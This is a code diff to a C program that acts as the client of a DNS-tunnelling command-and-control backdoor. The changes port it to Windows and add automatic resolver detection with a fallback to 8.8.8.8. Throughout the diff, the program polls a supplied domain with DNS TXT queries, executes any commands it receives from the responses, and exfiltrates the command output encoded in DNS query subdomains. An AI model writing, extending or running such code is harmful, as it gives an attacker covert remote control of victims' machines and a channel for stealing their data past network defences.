@@ -1,27 +1,41 @@
-#include "base32.c"
+#if defined(_WIN32) || defined(_WIN64)
+
+#include <iphlpapi.h>
+#include <stdint.h>
+#include <windows.h>
+#include <winsock2.h>
+
+#else
+
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <resolv.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+
+#endif
+
+#include "base32.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
 #include <sys/time.h>
-#include <sys/types.h>
 #include <time.h>
 #include <unistd.h>
 
 /* configurable */
-#define PORT_NUMBER (41198)                   /* sending port */
+#define PORT_NUMBER (41198)    /* outbound port */
+#define BACKUP_DNS ("8.8.8.8") /* when obtaining default resolver failed */
 #define DATA_PART_LENGTH (3 * SUBDOMAIN_SIZE) /* bytes of data in domain */
-#define DEAD_SERVER_HELLO_INTERVAL_IN_SEC 60  /* server doesn't respond */
-#define ALIVE_SERVER_HELLO_INTERVAL_IN_SEC 5  /* server responds */
+#define DEAD_SERVER_HELLO_INTERVAL_IN_SEC 5   /* server doesn't respond */
+#define ALIVE_SERVER_HELLO_INTERVAL_IN_SEC 2  /* server responds */
 
 /* const */
 #define TXT (16)
 #define HELLO_ID (65535)
 #define SUBDOMAIN_SIZE (63)
 #define END_OF_TRANSMISSION_ID (65534)
+#define COMMAND_RESULT_BUFFER_SIZE (2097152)
 #define DNS_REQUEST_SIZE(data_size) (sizeof(struct dns_header) + data_size + 4)
 
 /* representation of DNS query header */
@@ -54,6 +68,47 @@ int prepare_domain(const char *raw_domain, const int length, char *result) {
       size++;
   }
   return ++result_index;
+}
+
+/*
+ * Reads default DNS resolver from operating system and sets sockaddr_in struct
+ * pointed by pointer from function arguments. Returns two values: 0 (success),
+ * 1 (failed).
+ */
+int set_default_dns_resolver(struct sockaddr_in *dns_address) {
+#if defined(_WIN32) || defined(_WIN64)
+
+  FIXED_INFO *pFixedInfo;
+  ULONG ulOutBufLen;
+  pFixedInfo = (FIXED_INFO *)malloc(sizeof(FIXED_INFO));
+  ulOutBufLen = sizeof(FIXED_INFO);
+  if (GetNetworkParams(pFixedInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+    free(pFixedInfo);
+    pFixedInfo = (FIXED_INFO *)malloc(ulOutBufLen);
+    if (pFixedInfo == NULL) {
+      printf("Error allocating memory needed to call GetNetworkParams\n");
+      return 1;
+    }
+  }
+  dns_address->sin_family = AF_INET;
+  dns_address->sin_addr.s_addr =
+      inet_addr(pFixedInfo->DnsServerList.IpAddress.String);
+  dns_address->sin_port = htons(53);
+  if (pFixedInfo)
+    free(pFixedInfo);
+  return 0;
+
+#else // LINUX
+
+  if (res_init() == 0) {
+    *dns_address = _res.nsaddr_list[0];
+    return 0;
+  } else {
+    printf("Couldn't read dns resolver config!\n");
+    return 1;
+  }
+
+#endif
 }
 
 /*
@@ -223,8 +278,7 @@ int send_data(const char *data, const uint64_t dataSize,
     send_request(TXT, msg_id, client_id, data + index, DATA_PART_LENGTH,
                  domain_name, domain_name_size, network_socket,
                  dns_server_address);
-    if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
-                 NULL) < 0) {
+    if (recvfrom(network_socket, dummy_dns_desponse, 512, 0, NULL, NULL) < 0) {
       printf("No ACK from the server! Canceling sending ...\n");
       return 1;
     }
@@ -235,8 +289,7 @@ int send_data(const char *data, const uint64_t dataSize,
   send_request(TXT, msg_id, client_id, data + index, dataSize - index,
                domain_name, domain_name_size, network_socket,
                dns_server_address);
-  if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
-               NULL) < 0) {
+  if (recvfrom(network_socket, dummy_dns_desponse, 512, 0, NULL, NULL) < 0) {
     printf("No ACK from the server! Canceling sending ...\n");
     return 1;
   }
@@ -245,8 +298,7 @@ int send_data(const char *data, const uint64_t dataSize,
   send_request(TXT, (uint16_t)END_OF_TRANSMISSION_ID, client_id, "", 0,
                domain_name, domain_name_size, network_socket,
                dns_server_address);
-  if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
-               NULL) < 0) {
+  if (recvfrom(network_socket, dummy_dns_desponse, 512, 0, NULL, NULL) < 0) {
     printf("No ACK from the server! Canceling sending ...\n");
     return 1;
   }
@@ -297,30 +349,46 @@ void execute_command(const char *command, const int command_size,
  */
 void start_communication(const char *domain_name, const int domain_name_size,
                          const uint8_t client_id) {
+
   struct sockaddr_in client_address;
   struct sockaddr_in dns_server_address;
   char command[128];
   char dns_response[512];
-  char data_to_send[2097152];
+  char *data_to_send = malloc(COMMAND_RESULT_BUFFER_SIZE);
   int net_socket = -1;
-
-  struct timeval tv;
-  tv.tv_sec = 5;
-  tv.tv_usec = 0;
 
   client_address.sin_family = AF_INET;
   client_address.sin_addr.s_addr = INADDR_ANY;
   client_address.sin_port = htons(PORT_NUMBER);
 
-  if (res_init() == 0) {
-    dns_server_address = _res.nsaddr_list[0];
-  } else {
-    printf("Couldn't read dns resolver config!\n");
+#if defined(_WIN32) || defined(_WIN64)
+
+  int timeout_in_ms = 5000;
+  WSADATA wsa;
+
+  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+    printf("Winsoc initialisation failed!\n");
     exit(1);
   }
 
-  net_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-  if (net_socket == -1) {
+#else
+
+  struct timeval tv;
+  tv.tv_sec = 5;
+  tv.tv_usec = 0;
+
+#endif
+
+  if (set_default_dns_resolver(&dns_server_address) != 0) {
+    printf("Failed to obtain default DNS resolver from system!\nUsing backup: "
+           "%s\n",
+           BACKUP_DNS);
+    dns_server_address.sin_family = AF_INET;
+    dns_server_address.sin_addr.s_addr = inet_addr(BACKUP_DNS);
+    dns_server_address.sin_port = htons(53);
+  }
+
+  if ((net_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
     perror("Failed to create socket!");
     exit(1);
   }
@@ -332,21 +400,31 @@ void start_communication(const char *domain_name, const int domain_name_size,
     exit(1);
   }
 
+#if defined(_WIN32) || defined(_WIN64)
+
+  if (setsockopt(net_socket, SOL_SOCKET, SO_RCVTIMEO,
+                 (const char *)&timeout_in_ms, sizeof(timeout_in_ms)) < 0) {
+    printf("Socket timeout config error!");
+  }
+
+#else
+
   if (setsockopt(net_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
     printf("Socket timeout config error!");
   }
 
+#endif
+
   while (1) {
     memset(command, 0, sizeof(command));
     memset(dns_response, 0, sizeof(dns_response));
-    memset(data_to_send, 0, sizeof(data_to_send));
+    memset(data_to_send, 0, COMMAND_RESULT_BUFFER_SIZE);
 
     send_request(TXT, (uint16_t)HELLO_ID, client_id, "", 0, domain_name,
                  domain_name_size, net_socket, dns_server_address);
     printf("Hello packet sent\n");
 
-    if (recvfrom(net_socket, (char *)dns_response, 512, MSG_WAITALL, NULL,
-                 NULL) < 0) {
+    if (recvfrom(net_socket, (char *)dns_response, 512, 0, NULL, NULL) < 0) {
       printf("Timeout!\n");
     } else {
       /* Valid DNS response and TXT record has a base32 data */
@@ -354,7 +432,7 @@ void start_communication(const char *domain_name, const int domain_name_size,
         if (strlen(command) > 7) {
           printf("Received response with command: ");
           execute_command(command, strlen(command), data_to_send,
-                          sizeof(data_to_send));
+                          COMMAND_RESULT_BUFFER_SIZE);
           printf("Sending command result ...\n");
           send_data(data_to_send, strlen(data_to_send), client_id, domain_name,
                     domain_name_size, net_socket, dns_server_address);
@@ -376,6 +454,7 @@ int main(int argc, char *argv[]) {
   time_t tt;
   int seed = time(&tt);
   srand(seed);
+  memset(domain_name, 0, 300);
 
   if (argc < 2) {
     printf(
